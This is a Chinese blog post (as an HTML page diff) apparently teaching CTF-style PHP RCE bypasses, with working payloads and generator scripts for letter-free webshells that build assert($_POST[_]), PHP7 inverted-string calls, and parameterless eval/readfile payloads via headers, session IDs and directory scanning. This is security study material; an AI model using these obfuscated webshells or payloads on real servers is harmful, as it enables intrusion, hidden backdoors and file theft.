@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>特殊的RCE ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">特殊的RCE</p>
+            <br>
+            
+            <p>Friday, November 8th 2019, 9:09 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近看到了几种rce的骚操作，在这里记录一下。</p>
+<h1 id="无字母数字的RCE"><a href="#无字母数字的RCE" class="headerlink" title="无字母数字的RCE"></a>无字母数字的RCE</h1><p>举个栗子：</p>
+<pre><code>&lt;?php
+if(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) {
+  eval($_GET[&#39;shell&#39;]);
+}
+</code></pre><p>这里我们传递的参数不能有字母和数字。<br>对于这种的限制 我们的思路就是，将那些非字母、数字的字符通过一些变换，最后能构造出a-z任意字符。然后再利用PHP允许动态函数执行的特点，拼接一个函数名，例如<code>assert</code>，然后动态调用就可以了。</p>
+<p><strong>注意</strong><br>在php5中 <code>assert</code>是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这中方法来动态执行任意代码。</p>
+<p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。</p>
+<h2 id="方法一：异或"><a href="#方法一：异或" class="headerlink" title="方法一：异或"></a>方法一：异或</h2><p>在PHP中，两个字符串执行异或操作之后，得到的还是一个字符串。我们可以通过两个非字母、数字的字符，他们进行异或来得到a-z中的任一个字符。这里的大部分是不可见字符，这里是用url编码表示。即</p>
+<pre><code>&lt;?php
+$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=&#39;assert&#39;;
+$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=&#39;_POST&#39;;
+$___=$$__;
+$_($___[_]); // assert($_POST[_]);
+</code></pre><p>可以写一个生成的脚本：</p>
+<pre><code>#coding=UTF-8
+import string
+import urllib
+
+def shell_code(want_str):
+    i=0
+    flag=&#39;&#39;
+    str_1 = string.punctuation+string.whitespace
+    for m in range(len(want_str)):
+        for j in str_1:
+            for k in str_1:
+                s = ord(j)^ord(k)
+                if chr(s)==want_str[i:i+1] :
+                    # print chr(s)
+                    # print i
+                    if chr(ord(j))==&#39;\&#39;&#39; or chr(ord(j))==&#39;\\&#39;:
+                        flag+=&#39;(\&#39;&#39;+urllib.quote(k)+&#39;\&#39;^\&#39;\\&#39;+urllib.quote(j)+&#39;\&#39;).&#39;
+                        i=i+1
+                        break
+                    if chr(ord(k))==&#39;\&#39;&#39; or chr(ord(k))==&#39;\\&#39;:
+                        flag+=&#39;(\&#39;\\&#39;+urllib.quote(k)+&#39;\&#39;^\&#39;&#39;+urllib.quote(j)+&#39;\&#39;).&#39;
+                        i=i+1
+                        break
+                    flag+= &#39;(\&#39;&#39;+urllib.quote(k)+&#39;\&#39;^\&#39;&#39;+urllib.quote(j)+&#39;\&#39;).&#39;
+                    # print flag
+                    i=i+1
+                    break
+                else:
+                    pass
+    return flag[0:len(flag)-1]
+
+
+
+want_str = &#39;phpinfo&#39;
+print shell_code(want_str)
+</code></pre><h2 id="方法二：取反"><a href="#方法二：取反" class="headerlink" title="方法二：取反"></a>方法二：取反</h2><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，<br>比如<code>&#39;吏&#39;{2}</code>的结果是<code>&quot;\x8F&quot;</code>，其取反即为字母<code>p</code>;<br>一般利用汉字，因为汉字的uniocode占3字节。可以利用其构造字母</p>
+<p><img src="https://s2.ax1x.com/2020/02/05/1rOTIO.png" alt="1rOTIO.png"><br><img src="https://s2.ax1x.com/2020/02/05/1rXDld.png" alt="1rXDld.png"></p>
+<pre><code>&lt;?php
+$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;); //True+True=2;$__=2
+$_=$__/$__; //$_=2/2=1
+$____=&#39;&#39;;
+$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});
+$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});
+$_=$$_____;
+$____($_[$__]);
+?&gt;
+assert($_POST[2]);
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/05/1rvNGD.png" alt="1rvNGD.png"></p>
+<h4 id="php7下的方法"><a href="#php7下的方法" class="headerlink" title="php7下的方法"></a>php7下的方法</h4><p>上面的方法在php7.0.12测试成功。php7.1.13和php7.2.10测试失败。未成功的原因<br>是assert不支持函数名动态执行代码。所以不能执行。<br>php7中修改了表达式执行的顺序：<a href="https://www.php.net/manual/zh/migration70.incompatible.php" target="_blank" rel="noopener">官方手册</a><br><img src="https://s2.ax1x.com/2020/02/05/1snMb6.png" alt="1snMb6.png"><br>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式</p>
+<p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p>
+<pre><code class="html">(~%8F%97%8F%96%91%99%90)();  //phpinfo
+</code></pre>
+<p>写个脚本：</p>
+<pre><code class="html">&lt;?php 
+$str = &#39;phpinfo&#39;;
+$str = str_split($str);
+$flag=&#39;&#39;;
+foreach ($str as  $value) {
+    $flag.=~$value;
+}
+
+echo &quot;(~&quot;.urlencode($flag).&quot;)();&quot;;
+</code></pre>
+<h2 id="方法三：递增运算"><a href="#方法三：递增运算" class="headerlink" title="方法三：递增运算"></a>方法三：递增运算</h2><p>参考：<a href="https://www.php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">官方手册</a></p>
+<p>利用php特性，在处理字符串变量的算术运算时，PHP沿袭了Perl的习惯，而非C的。如：<br><code>a=′Z′;a++;</code>结果$a的值为<code>AA</code>，而在C中，结果为<code>{</code>,(<code>Z</code>的ASCII值是90，而<code>{</code>的ASCII值为91)。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z A-Z）。<br><img src="https://s2.ax1x.com/2020/02/05/1sShsH.png" alt="1sShsH.png"><br>所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
+<p>那么如何拿到字符串’a’的变量呢？</p>
+<p>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值是<code>Array：</code>再取这个字符串的第一个字母，就可以获得’A’了。<br>参考P神写的webshell</p>
+<pre><code>&lt;?php
+$_=[];
+$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;
+$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__++;$__++;$__++;$__++; // E 
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$___.=$__;
+
+$____=&#39;_&#39;;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$____.=$__;
+
+$_=$$____;
+$___($_[_]); // ASSERT($_POST[_]);
+
+</code></pre><p>因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>。</p>
+<h2 id="方法四：执行可控文件"><a href="#方法四：执行可控文件" class="headerlink" title="方法四：执行可控文件"></a>方法四：执行可控文件</h2><p>我们知道在linux环境下：</p>
+<ol>
+<li>shell下可以利用<code>.</code>来执行任意脚本</li>
+<li>Linux文件名支持用glob通配符代替</li>
+</ol>
+<p>用<code>. file</code>执行文件，是不需要file有x权限的。就可以利用<code>.</code>来执行它了</p>
+<p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
+<p><code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。<br>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势来干掉一些特殊字符。<br>glob支持利用<code>[0-9]</code>来表示一个范围。所以，我们可以通过<code>[@-[]</code>来限制字符为大写字符，即ascii码值在40-91的字符。同样也可以限制在小写字符97-123即可，这样我们就可以准确的确定文件名。<br>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
+<h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><p>发现也考察了好多次这个 无参数RCE的知识点，发现大致思路就是<br>1.利用超全局变量进行bypass，进行RCE<br>2.进行任意文件读取<br>例子：</p>
+<pre><code class="html">if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {    
+    eval($_GET[&#39;code&#39;]);
+}
+</code></pre>
+<p>只能执行函数，但是不能传入参数即不能<code>function(&#39;123&#39;);</code>这种格式的。<br>因此，缺少参数，就增加了我们了rce的难度。</p>
+<p>思想：<strong>超全局变量进行bypass，进行RCE。</strong></p>
+<p>超全局变量：</p>
+<pre><code class="html">$GLOBALS   //引用全局作用域中可用的全部变量
+$_SERVER   //服务器和执行环境信息
+$_GET      //HTTP GET 变量
+$_POST     //HTTP POST 变量
+$_FILES    //HTTP 文件上传变量
+$_COOKIE   //HTTP Cookies
+$_SESSION  //Session 变量
+$_REQUEST  //HTTP Request 变量 默认情况下包含了 [$_GET]，[$_POST] 和 [$_COOKIE]的数组。
+$_ENV      //环境变量
+</code></pre>
+<h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p><strong>注意：在apache环境下。nginx无法使用</strong><br>原因是getallheaders()是apache函数。<br>核心思路：<br>1.参数code不能使用带参数的php函数<br>2.让参数code获取其他位置传入的参数(http header)<br>3.getallheaders()可返回http header<br>4.code可以获取到http header中的参数，相当于任意参数调用<br>5.成功进行RCE</p>
+<p>我们先看一下<code>getallheaders()</code>函数的内容</p>
+<pre><code>array(8) {
+  [&quot;Host&quot;]=&gt;
+  string(9) &quot;127.0.0.1&quot;
+  [&quot;User-Agent&quot;]=&gt;
+  string(78) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
+  [&quot;Accept&quot;]=&gt;
+  string(63) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;
+  [&quot;Accept-Language&quot;]=&gt;
+  string(59) &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;
+  [&quot;Accept-Encoding&quot;]=&gt;
+  string(13) &quot;gzip, deflate&quot;
+  [&quot;Connection&quot;]=&gt;
+  string(10) &quot;keep-alive&quot;
+  [&quot;Upgrade-Insecure-Requests&quot;]=&gt;
+  string(1) &quot;1&quot;
+  [&quot;Cache-Control&quot;]=&gt;
+  string(9) &quot;max-age=0&quot;
+}
+
+</code></pre><p>发现里面包含了header头里面的所有信息，而这些信息是我们可控的，所以我们可以通过对信息的改变来进行RCE</p>
+<p>payload:</p>
+<pre><code class="html">?code=eval(end(getallheaders())); 执行http header的最后一个参数的值。
+</code></pre>
+<h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p><img src="https://s2.ax1x.com/2020/02/05/1sKS00.png" alt="1sKS00.png"></p>
+<p>测试发现其可以回显全局变量</p>
+<pre><code>$_GET
+$_POST
+$_FILES
+$_COOKIE
+</code></pre><p>可以利用<code>$_GET</code>进行RCE，例如</p>
+<pre><code>?code=eval(end(current(get_defined_vars())));&amp;a=phpinfo();
+</code></pre><p>current() 函数返回数组中的当前元素的值。<br>end() 函数返回数组中的最后一个元素的值。</p>
+<p><img src="https://s2.ax1x.com/2020/02/05/1sKrcj.png" alt="1sKrcj.png"></p>
+<h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h2><p><img src="https://s2.ax1x.com/2020/02/05/1ssPpQ.png" alt="1ssPpQ.png"><br>可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路:<code>hex2bin</code><br><img src="https://s2.ax1x.com/2020/02/05/1srjmt.png" alt="1srjmt.png"></p>
+<p>脚本：</p>
+<pre><code>import requests
+
+
+url = &#39;http://127.0.0.1/a.php?code=eval(hex2bin(session_id(session_start())));&#39;
+def str_to_hex(s):
+    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])
+payload = str_to_hex(&quot;phpinfo();&quot;)
+print payload
+cookies = {
+    &#39;PHPSESSID&#39;:payload
+}
+r = requests.get(url=url,cookies=cookies)
+print r.content
+
+
+</code></pre><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p><code>$_ENV</code>，对应函数为<code>getenv()</code><br>如何从一个偌大的数组中取出我们指定的值呢？ 我们医药用到两个函数：array_rand()和array_flip()：</p>
+<p>array_rand()获取数组中随机的一个键<br>array_flip() 交换数组中的键和值</p>
+<p>我们可以通过爆破来获取我们想要的值，来进行RCE。</p>
+<h2 id="直接读文件"><a href="#直接读文件" class="headerlink" title="直接读文件"></a>直接读文件</h2><p><code>getcwd()</code>获取当前目录<br><code>chdir()</code>  切换目录<br><img src="https://s2.ax1x.com/2020/02/05/1s2kdI.png" alt="1s2kdI.png"><br><code>dirname()</code>  返回路径中的目录部分<br><img src="https://s2.ax1x.com/2020/02/05/1s2nSS.png" alt="1s2nSS.png"><br><code>scandir()</code> — 列出指定路径中的文件和目录<br><code>next()</code> 返回数组中的下个单元<br><code>prev()</code> 返回数组的上一个单元<br><code>pos()</code>和<code>current()</code> 返回数组中的当前单元<br><code>end()</code> 返回数组中的最后单元<br><code>each()</code> 返回数组中当前的键／值对并将数组指针向前移动一步<br><code>reset()</code> 将数组的内部指针指向第一个单元</p>
+<p>遍历当前目录：<code>var_dump(scandir(getcwd()));</code></p>
+<p>遍历上一级目录：<code>var_dump(scandir(dirname(getcwd())));</code><br>切换到当前目录所在的目录:<code>chdir(dirname(getcwd()));</code><br>获取上级目录的所有文件：<code>scandir(dirname(chdir(dirname(getcwd()))))</code>  其中返回值为一维数组前两个值为’.’和’..’<br>从数组中获取自己想要的文件名这个上面有说明。</p>
+<p>读文件用 <code>readfile()</code>函数即可。</p>
+<p>payload:</p>
+<pre><code>?code=readfile(pos(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));
+</code></pre>
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;web安全</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
